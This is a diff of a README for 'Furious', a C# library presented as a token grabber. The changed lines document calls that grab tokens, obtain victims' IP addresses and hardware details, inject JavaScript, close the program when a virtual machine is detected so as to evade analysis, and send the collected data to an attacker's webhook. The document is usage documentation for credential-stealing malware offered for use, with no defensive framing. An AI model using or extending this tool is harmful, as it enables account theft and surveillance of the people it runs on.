@@ -7,12 +7,14 @@ Replace all occurances of "webhook-here" to your own server's webhook URL, this 
 Build the DLL and reference it in your project(s): ```using Furious;```
 
 #### To grab tokens call
-```Furious.Grabber.Start();```
-#### To grab tokens + IP address
-```Furious.Grabber.Start(true);```
-#### To check for a VM before attempting to grab anything
-```Furious.Grabber.Start(grabIP: true, checkForVM: true);``` - if a VM is detected, the application will close instantly.
-
-
+```Furious.Grabber.QuickStart(true);```
+#### To obtain IP address
+```Furious.Grabber.QuickStart(injectJS, grabIP: true);```
+#### To collect hardware information
+```Furious.Grabber.QuickStart(injectJS, grabIP, grabHardware: true);```
+#### To check for a virtual machine
+```Furious.Grabber.QuickStart(injectJS, grabIP, grabHardware, checkForVM: true);``` - if a VM is detected, the application will close instantly.
+#### To send data (hardware, ip etc.) to webhook
+```Furious.Grabber.SendData(await Grabber.GetHardware());```
 # Requests
 I do not know JS, I got it to work with luck, for those that do, the JS in the text files may look extremely messy. If you're able to optimise/clean-up the code I would greatly appreciate it.
